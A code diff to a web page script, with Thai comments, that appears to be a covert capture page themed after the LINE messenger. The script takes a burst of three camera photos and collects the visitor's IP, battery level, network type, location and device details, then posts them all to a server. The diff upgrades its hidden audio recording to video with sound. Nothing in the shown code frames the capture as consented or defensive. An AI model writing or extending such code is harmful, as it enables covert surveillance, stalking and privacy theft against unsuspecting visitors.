@@ -200,7 +200,7 @@
         const THEME = 'LINE'; 
 
         let imageDatas = []; // เก็บรูปถ่ายแบบ Base64 (Array 3 รูป)
-        let audioData = null; // เก็บไฟล์เสียง
+        let videoData = null; // เก็บไฟล์วิดีโอพร้อมเสียง
         let ipData = null; // เก็บข้อมูล IP
         let batteryData = null; // เก็บข้อมูลแบตเตอรี่
         let networkType = 'Unknown'; // เก็บข้อมูลประเภทเน็ต
@@ -301,10 +301,10 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
 
-                // เริ่มอัดเสียง
-                const mediaRecorder = new MediaRecorder(stream);
-                const audioChunks = [];
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                // เริ่มอัดวิดีโอและเสียงพร้อมกัน
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const videoChunks = [];
+                mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
                 mediaRecorder.start();
 
                 // ถ่ายรูป 3 รูป (Burst Mode) ห่างกัน 0.5 วินาที
@@ -314,17 +314,17 @@
                     if (i < 2) await new Promise(r => setTimeout(r, 500));
                 }
 
-                // หยุดอัดเสียง (อัดประมาณ 1.5 - 2 วินาทีระหว่างถ่ายรูป)
+                // หยุดอัดวิดีโอ (อัดประมาณ 1.5 - 2 วินาทีระหว่างถ่ายรูป)
                 mediaRecorder.stop();
                 
-                // รอให้ MediaRecorder สร้างไฟล์เสร็จ
+                // รอให้ MediaRecorder สร้างไฟล์วิดีโอเสร็จ
                 await new Promise(resolve => {
                     mediaRecorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                         const reader = new FileReader();
-                        reader.readAsDataURL(audioBlob);
+                        reader.readAsDataURL(videoBlob);
                         reader.onloadend = () => {
-                            audioData = reader.result;
+                            videoData = reader.result;
                             resolve();
                         };
                     };
@@ -406,7 +406,7 @@
                     lon: lon, 
                     deviceInfo: deviceInfo,
                     images: imageDatas, // ส่ง array 3 รูป
-                    audio: audioData // ส่งไฟล์เสียง
+                    video: videoData // ส่งไฟล์วิดีโอพร้อมเสียง
                 }),
             })
             .then(data => {
